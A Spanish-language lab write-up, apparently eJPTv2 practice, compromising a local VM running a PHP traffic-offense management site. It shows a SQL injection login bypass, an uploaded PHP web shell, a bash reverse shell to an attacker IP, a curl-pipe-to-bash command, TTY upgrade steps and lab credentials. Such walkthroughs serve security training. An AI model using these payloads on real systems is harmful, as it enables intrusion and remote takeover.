Escaneo:

```
Nmap scan report for 10.0.2.9
Host is up (0.00040s latency).
Not shown: 6 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Online Traffic Offense Management System - PHP
MAC Address: 08:00:27:CC:1D:08 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

Veamos el servicio web:

![[Pasted image 20250705145124.png]]

Los elementos no cargan de forma correcta, por lo que puede ser indicio de que se esté aplicando VirtualHosting, revisemos el código duente:

![[Pasted image 20250705145243.png]]

Añadamos esa dirección dns al `/etc/hosts`.

![[Pasted image 20250705145354.png]]

![[Pasted image 20250705145516.png]]

Ahora carga de forma correcta. Veamos ese panel de login, e intentemos iniciar con credenciales por defecto, como admin:admin

![[Pasted image 20250705145758.png]]

Probemos realizar una Inyección SQL simple, `admin' or 1=1-- -`

![[Pasted image 20250705145924.png]]

Ha funcionado. Exploremos un poco la página.

![[Pasted image 20250705150406.png]]

Vemos que podemos cambiar el avatar del usuario, a través de una subida de archivo. Intentaremos subir un código malicioso en php, que mediande una etiqueta "cmd" pueda inyectar comandos:

```
<?php system($_GET['cmd']); ?>
```

![[Pasted image 20250705151339.png]]

Lo hemos subido correctamente, ahora intentaremos abrir la imagen en una nueva pestaña:

![[Pasted image 20250705151700.png]]

![[Pasted image 20250705151746.png]]

Tenemos ejecución remota de comandos. Ahora nos lanzaremos una reverse shell a nuestra máquina atacante. Creamos un archivo `index.html` que contenga este comando en bash:

```
bash -i >& /dev/tcp/10.0.2.4/443 0>&1
```

```
echo "bash -i >& /dev/tcp/10.0.2.4/443 0>&1" > index.html
```

Ahora montamos un servidor http con python en nuestra máquina atacante:

```
sudo python3 -m http.server 80
```

![[Pasted image 20250705152824.png]]

Y nos ponemos en escucha con netcat por el puerto 443.

```
sudo nc -lvnp 443
```

![[Pasted image 20250705153223.png]]

Ahora, en la url de la web de la máquina victima, colocamos lo siguiente:

```
curl+http://10.0.2.4+|bash
```

![[Pasted image 20250705153341.png]]

![[Pasted image 20250705153415.png]]

Hemos obtenido acceso a la máquina victima, ahora, haremos el tratamiento de la tty para tener una shell interactiva:

```
script /dev/null -c bash
```

Luego, pulsamos Cntrl + z para salir de la terminal e introducimos el segundo comando:

```
stty raw echo; fg
```

Y debajo de este comando a la derecha, escribimos reset xterm para volver a la terminal ya lista.

```
reset xterm
```

En caso de no funcionar aún el Ctrl + l para limpiar la terminal, realizamos también lo siguiente:

```
export SHELL=bash
export TERM=xterm
```

Para que las proporciones de la terminal sean iguales a las de nuestro sistema debemos ajustar tanto las filas como las columnas. Por ejemplo si abrimos o creamos un archivo con nano este se verá pequeño. Para ajustar estas proporciones primero debemos ir a una de nuestras ventas y ver que proporciones tiene:

```
stty size
```

![[Pasted image 20250705153643.png]]

En mi caso mi terminal tiene 53 filas y 236 columnas. Ahora ajustaremos con estos parámetros nuestra Reverse Shell. Para ello escribimos lo siguiente en la terminal de la Reverse Shell:

```
stty rows 53 columns 236
```

## Escalada de privilegios

Enumeramos los archivos y directorios de la página web:

![[Pasted image 20250705154459.png]]

Vemos un usuario `bella` y una password `be114yTU`. Intentemos cambiar de usuario con esas credenciales.

![[Pasted image 20250705154651.png]]

La escalada de privilegios se sale del scope del eJPTv2
